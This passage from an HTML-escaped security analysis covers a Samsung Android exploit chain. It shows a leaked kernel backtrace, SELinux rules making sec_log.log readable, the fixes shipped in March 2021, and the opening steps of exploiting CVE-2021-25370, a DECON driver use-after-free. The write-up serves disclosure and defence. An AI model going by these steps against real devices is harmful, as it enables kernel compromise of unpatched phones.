&amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] dump_stack+0xa8/0xe4&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635731] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] __warn+0xbc/0x164tv&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635738] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] report_bug+0x15c/0x19c&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635746] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] bug_handler+0x30/0x8c&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635753] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] brk_handler+0x94/0x150&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635760] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] do_debug_exception+0xc8/0x164&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635766] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] Exception stack(0xffffff8014c2bb40 to 0xffffff8014c2bc80)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635775] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bb40: ffffffc91b00fa40 000000004004befe 0000000000000000 0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;lt;4&amp;gt;[90808.635781] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bb60: &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;ffffffc061b65800&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;000000000ecc0408 000000000000000a 000000000000000a&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635789] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bb80: 000000004004be30 000000000000be00 ffffffc86b49d700 000000000000000b&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635796] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bba0: ffffff8014c2bdd0 0000000080000000 0000000000000026 0000000000000026&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;lt;4&amp;gt;[90808.635802] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bbc0: &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;ffffff8008429834&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;000000000041bd50 0000000000000000 0000000000000000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635809] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bbe0: ffffffc88b42d500 ffffffffffffffea ffffffc96bda5bc0 0000000000000004&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635816] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bc00: 0000000000000000 0000000000000124 000000000000001d ffffff8009293000&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635823] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bc20: ffffffc89bb6b180 ffffff8014c2bdf0 ffffff80084294bc ffffff8014c2bd80&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635829] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bc40: ffffff800885014c 0000000020400145 0000000000000008 0000000000000008&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;lt;4&amp;gt;[90808.635836] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] bc60: 0000007fffffffff 0000000000000001 ffffff8014c2bdf0 ffffff800885014c&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;lt;4&amp;gt;[90808.635843] &amp;nbsp;[4: &amp;nbsp; &amp;nbsp;poc:25943] [&amp;lt;0000000000000000&amp;gt;] el1_dbg+0x18/0x74&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/log/sec_log.log&lt;/span&gt;&lt;span&gt;&amp;nbsp;has the SELinux context &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumplog_data_file&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is widely accessible to many apps as shown below. The exploit is currently running within the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;SamsungTTS&lt;/span&gt;&lt;span&gt;&amp;nbsp;app which is the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_app&lt;/span&gt;&lt;span&gt;&amp;nbsp;SELinux context. While the exploit does not have access to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/dev/kmsg&lt;/span&gt;&lt;span&gt;&amp;nbsp;due to SELinux access controls, it can access the same contents when they are copied to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sec_log.log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;which has more permissive access.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f01b7aab76bb09bed75d19a610b808d720f8deb7\"&gt;&lt;/a&gt;&lt;a id=\"t.14\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;$ sesearch &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;A &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;t dumplog_data_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;c file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;p open precompiled_sepolicy &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;|&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;grep _app&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow aasa_service_app dumplog_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow dualdar_app dumplog_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;append create getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read rename setattr unlink write &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow platform_app dumplog_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;append create getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read rename setattr unlink write &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow priv_app dumplog_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;append create getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read rename setattr unlink write &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;allow system_app dumplog_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;append create getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;map open read rename setattr unlink write &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow teed_app dumplog_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;append create getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read rename setattr unlink write &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;allow vzwfiltered_untrusted_app dumplog_data_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;:&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;getattr ioctl &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;lock&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;map open read &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.hmfvv1p1wpse\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Fixing the vulnerability&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;There were a few different changes to address this vulnerability:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c36 lst-kix_hbruetvjkelf-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Modified the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumpstate&lt;/span&gt;&lt;span&gt;&amp;nbsp;binary on the device &amp;ndash; As of the March 2021 update, dumpstate no longer writes to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/data/log/sec_log.log&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;Removed the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;bugreport&lt;/span&gt;&lt;span&gt;&amp;nbsp;service from &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;dumpstate.rc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;In addition there were a few changes made earlier in 2020 that when included would prevent this vulnerability in the future:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c36 lst-kix_x9fpm1r5kf6m-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;As mentioned above, in February 2020 ARM had released version r21p0 of the Mali driver which had replaced the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the more appropriate &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;pr_warn&lt;/span&gt;&lt;span&gt;&amp;nbsp;which does not log a full backtrace. The March 2021 Samsung firmware included updating from version r19p0 of the Mali driver to r26p0 which used &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;pr_warn&lt;/span&gt;&lt;span&gt;&amp;nbsp;instead of &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;WARN_ON&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c21 c8 li-bullet-0\"&gt;&lt;span&gt;In April 2020, &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/arch/arm64/kernel/traps.c?h=linux-4.14.y&amp;id=6dc0256f802be6bc783fb9542affb48d267f592c\"&gt;upstream Linux made a change&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;to no longer include raw stack contents in kernel backtraces.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"c1 c8 c14 c39\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"vdnyYxSRCi-c28 vdnyYxSRCi-c8\" id=\"h.9gyws0wgb00m\"&gt;&lt;span class=\"vdnyYxSRCi-c31\"&gt;Vulnerability #3 - Arbitrary kernel read and write&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The final vulnerability in the chain (CVE-2021-25370) is a use-after-free of a file struct in the Display and Enhancement Controller (DECON) Samsung driver for the Display Processing Unit (DPU). According to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://patchwork.kernel.org/project/dri-devel/patch/1417097460-18403-1-git-send-email-ajaykumar.rs@samsung.com/\"&gt;upstream commit message&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;, DECON is responsible for creating the video signals from pixel data. This vulnerability is used to gain arbitrary kernel read and write access. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/s1213/image1.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDPl73oa-7g4YO-V5owrIWmBkxynQqdOD4lgWyubSEx7dg2BoS502R_3o4QZjFfP3gjwoEVNv7__hYBltjZuj5aIq22wdDPg8klVTrahHcwp-TxgHoOkeIerXdOUh2igwrLtPYFBlDqEJdaccmMuV88suhYn9v07QfM3b2NlHZ0zNCux84B4RojB-U/s1200/image1.png\" border=\"0\" alt=\"Screenshot of the CVE-2021-25370 entry from Samsung&amp;#39;s March 2021 security update. It reads: &amp;amp;quot;SVE-2021-19925 (CVE-2021-25370): Memory corruption in dpu driver &amp;nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0), R(11.0) devices with selected Exynos chipsets Reported on: December 12, 2020 Disclosure status: Privately disclosed. An incorrect implementation handling file descriptor in dpu driver prior to SMR Mar-2021 Release 1 results in memory corruption leading to kernel panic. The patch fixes incorrect implementation in dpu driver to address memory corruption.\" style=\"max-height: 750px; max-width: 600px;\"title=\"Screenshot of the CVE-2021-25370 entry from Samsung&amp;#39;s March 2021 security update. It reads: &amp;amp;quot;SVE-2021-19925 (CVE-2021-25370): Memory corruption in dpu driver &amp;nbsp;Severity: Moderate Affected versions: O(8.x), P(9.0), Q(10.0), R(11.0) devices with selected Exynos chipsets Reported on: December 12, 2020 Disclosure status: Privately disclosed. An incorrect implementation handling file descriptor in dpu driver prior to SMR Mar-2021 Release 1 results in memory corruption leading to kernel panic. The patch fixes incorrect implementation in dpu driver to address memory corruption.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c8 vdnyYxSRCi-c17\" id=\"h.ueqobjujvt37\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Find the PID of android.hardware.graphics.composer&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;To be able to trigger the vulnerability the exploit needs an fd for the driver in order to send ioctl calls. To find the fd, the exploit has to to iterate through the fd &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;proc&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;directory for the target process. Therefore the exploit first needs to find the PID for the graphics process. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit connects to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://cs.android.com/android/platform/superproject/+/586af4e17de6b8bf665dc2a1bb61f46fddb326f7:system/logging/logd/main.cpp;l=256\"&gt;LogReader which listens at&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/dev/socket/logdr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. When a client connects to LogReader, LogReader writes the log contents back to the client. The exploit then configures LogReader to send it logs for the main log buffer (0), system log buffer (3), and the crash log buffer (4) by writing back to LogReader via the socket:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.ead3e3d8bb8dda4abd6611b15560f906e9e1ef80\"&gt;&lt;/a&gt;&lt;a id=\"t.15\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;stream lids&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;3&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The exploit then monitors the log contents until it sees the words &amp;lsquo;display&amp;rsquo; or &lt;/span&gt;&lt;span&gt;&amp;lsquo;SDM&amp;rsquo;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. Once it finds a &amp;lsquo;display&amp;rsquo; or &amp;lsquo;SDM&amp;rsquo; log entry, the exploit then reads the PID from that log entry.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Now it has the PID of android.hardware.graphics.composer, where &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://source.android.com/docs/core/graphics/hwc\"&gt;android.hardware.graphics composer is the Hardware Composer HAL&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;Next the exploit needs to find the full file path for the DECON driver. The full file path can exist in a few different places on the filesystem so to find which one it is on this device, the exploit iterates through the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;/proc/&amp;lt;PID&amp;gt;/fd/&lt;/span&gt;&lt;span&gt;&amp;nbsp;directory looking for any file path that contains &amp;ldquo;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;graphics/fb0&lt;/span&gt;&lt;span&gt;&amp;rdquo;, the DECON driver. It uses &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;readlink&lt;/span&gt;&lt;span&gt;&amp;nbsp;to find the file path for each &lt;/span&gt;&lt;span 